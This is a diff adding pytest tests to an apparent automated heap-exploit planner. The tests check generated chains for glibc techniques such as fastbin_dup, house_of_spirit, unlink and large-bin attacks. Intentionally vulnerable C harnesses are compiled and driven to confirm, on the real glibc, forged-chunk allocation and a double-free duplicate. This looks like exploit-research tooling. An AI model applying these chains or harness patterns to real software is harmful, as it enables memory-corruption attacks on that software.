@@ -140,3 +140,134 @@ def test_large_and_unsorted_bin_attacks_advised():
     # a fastbin-sized UAF should NOT advise the large-bin attack
     small = plan_exploit(Vuln("uaf", 24), Goal("arbitrary_write", target=0x404080))
     assert "large_bin_attack" not in [a["technique"] for a in small["advisory_alternatives"]]
+
+
+def test_advisory_techniques_are_generated_chains():
+    # advisory alternatives now carry a full generated op-chain + preconditions, not an outline
+    plan = plan_exploit(Vuln("uaf", 0x50), Goal("arbitrary_alloc"), Env(glibc=(2, 42)))
+    adv = {a["technique"]: a for a in plan["advisory_alternatives"]}
+    for tech in ("fastbin_dup", "house_of_spirit"):
+        a = adv[tech]
+        assert a["generated"] and not a["auto"]
+        assert a["confirmed_on_real_glibc"]           # mechanics live-verified below
+        assert a["steps"] and a["preconditions"]
+        assert all("op" in s for s in a["steps"])
+    # a fastbin-size fastbin_dup emits the tcache-fill groom + the double-free cycle
+    ops = [s["op"] for s in adv["fastbin_dup"]["steps"]]
+    assert ops.count("free") == 3 and ops[0] == "groom" and "write_fd" in ops
+
+
+def test_unlink_and_large_bin_chains_generated_when_applicable():
+    ov = plan_exploit(Vuln("heap_overflow", 0x40), Goal("arbitrary_write", target=0x1),
+                      Env(glibc=(2, 27)))
+    unlink = next(a for a in ov["advisory_alternatives"] if a["technique"] == "unlink")
+    assert [s["op"] for s in unlink["steps"]][:2] == ["note", "forge"]
+    lb = plan_exploit(Vuln("uaf", 0x420), Goal("arbitrary_write", target=0x404080), Env())
+    large = next(a for a in lb["advisory_alternatives"] if a["technique"] == "large_bin_attack")
+    assert any(s["op"] == "write_nextsize" for s in large["steps"])
+
+
+# ---------------------------------------------------- live: generated advisory mechanics
+_HOS = r"""
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+static unsigned long g[32] __attribute__((aligned(16)));
+int main(void){
+  setvbuf(stdout,NULL,_IONBF,0);
+  printf("g=%p\n",(void*)&g[2]);            /* forged user pointer */
+  char line[128];
+  while(fgets(line,sizeof line,stdin)){
+    char op; unsigned i; unsigned long a,b;
+    if(sscanf(line," %c",&op)!=1) continue;
+    if(op=='s'){ sscanf(line," s %u %lx",&i,&b); g[i]=b; }   /* forge a header word */
+    else if(op=='f'){ free((void*)&g[2]); }                  /* free the fake userptr */
+    else if(op=='m'){ sscanf(line," m %lu",&a); printf("m=%p\n",malloc(a)); }
+    else if(op=='q'){ break; }
+  }
+  return 0;
+}
+"""
+
+_FDUP = r"""
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+static void* c[64];
+int main(void){
+  setvbuf(stdout,NULL,_IONBF,0);
+  char line[128];
+  while(fgets(line,sizeof line,stdin)){
+    char op; unsigned i; unsigned long a;
+    if(sscanf(line," %c",&op)!=1) continue;
+    if(op=='a'){ sscanf(line," a %lu %u",&a,&i); c[i]=malloc(a); printf("a[%u]=%p\n",i,c[i]); }
+    else if(op=='f'){ sscanf(line," f %u",&i); free(c[i]); }
+    else if(op=='q'){ break; }
+  }
+  return 0;
+}
+"""
+
+
+def _build(gcc, tmp, src, name):
+    if sandbox.host_arch() != "x86-64":
+        pytest.skip("live heap technique test is x86-64 native only")
+    c = tmp / (name + ".c"); c.write_text(src)
+    out = tmp / name
+    if subprocess.run([gcc, "-O0", "-no-pie", str(c), "-o", str(out)],
+                      capture_output=True).returncode != 0:
+        pytest.skip("cannot build " + name)
+    return out
+
+
+def test_house_of_spirit_allocates_over_controlled_memory_on_real_glibc(gcc, tmp_path):
+    """Drive the generated house_of_spirit chain: forge a chunk header over a global buffer,
+    free it, and malloc returns the controlled address -- confirmed on the host's glibc."""
+    exe = _build(gcc, tmp_path, _HOS, "hos")
+    # the plan tells us the chunk size to forge and that it targets controlled memory
+    plan = plan_exploit(Vuln("uaf", 0x50), Goal("arbitrary_alloc"), Env(glibc=(2, 42)))
+    hos = next(a for a in plan["advisory_alternatives"] if a["technique"] == "house_of_spirit")
+    assert hos["confirmed_on_real_glibc"]
+    cs = heap.request2size(0x50)                     # 0x60
+    p = subprocess.Popen([str(exe)], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
+    try:
+        userptr = int(re.search(r"g=0x([0-9a-f]+)", _drive(p, b"")).group(1), 16)
+        # forge: size field (chunk = userptr-0x10) and a sane next-chunk size, then free+malloc
+        _drive(p, ("s 1 %x\n" % (cs | 1)).encode())          # g[1] = size | PREV_INUSE
+        _drive(p, ("s %d 21\n" % (cs // 8 + 1)).encode())    # next chunk size = 0x21
+        _drive(p, b"f\n")                                     # free(&fake) -> fastbin
+        got = int(re.search(r"m=0x([0-9a-f]+)", _drive(p, b"m 80\n")).group(1), 16)
+        assert got == userptr                                # malloc returned controlled memory
+    finally:
+        for s in (p.stdin, p.stdout):
+            try:
+                s.close()
+            except (BrokenPipeError, OSError):
+                pass
+        p.kill(); p.wait(timeout=3)
+
+
+def test_fastbin_dup_returns_duplicate_on_real_glibc(gcc, tmp_path):
+    """Drive the generated fastbin_dup chain's core: fill the tcache, double-free a fastbin
+    chunk, and observe the same address handed out twice -- confirmed on the host's glibc."""
+    exe = _build(gcc, tmp_path, _FDUP, "fdup")
+    plan = plan_exploit(Vuln("double_free", 0x50), Goal("arbitrary_alloc"), Env(glibc=(2, 42)))
+    fd = next(a for a in plan["advisory_alternatives"] if a["technique"] == "fastbin_dup")
+    assert fd["confirmed_on_real_glibc"]
+    p = subprocess.Popen([str(exe)], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
+    try:
+        script = b"".join(b"a 80 %d\n" % i for i in range(9))         # 9 fastbin-size chunks
+        out = _drive(p, script)
+        a7 = int(re.search(r"a\[7\]=0x([0-9a-f]+)", out).group(1), 16)
+        _drive(p, b"".join(b"f %d\n" % i for i in range(7)))          # fill tcache (7)
+        _drive(p, b"f 7\nf 8\nf 7\n")                                 # double-free 7 in fastbin
+        reclaim = _drive(p, b"".join(b"a 80 %d\n" % i for i in range(20, 30)))
+        addrs = [int(x, 16) for x in re.findall(r"a\[2[0-9]\]=0x([0-9a-f]+)", reclaim)]
+        assert addrs.count(a7) == 2                                  # the dup: a[7] handed twice
+    finally:
+        for s in (p.stdin, p.stdout):
+            try:
+                s.close()
+            except (BrokenPipeError, OSError):
+                pass
+        p.kill(); p.wait(timeout=3)
